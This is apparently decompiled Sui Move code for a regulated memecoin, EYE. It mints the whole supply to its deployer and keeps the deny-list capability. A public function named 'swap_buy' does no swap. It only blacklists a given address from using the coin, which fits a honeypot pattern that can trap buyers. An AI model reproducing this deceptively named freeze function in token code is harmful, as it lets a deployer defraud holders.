module 0x2887d2eca8c78a386675c89bd19392b8776fc768c584b44112c19245ee9d749d::eye {
    struct EYE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: EYE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<EYE>(arg0, 9, b"EYE", b"EYE Am Watching You", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmUfw7TsG4VeMyQKnb4UEoZXKfvaUiLbGxguYaT1XjyXWG"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<EYE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<EYE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<EYE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<EYE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<EYE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<EYE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

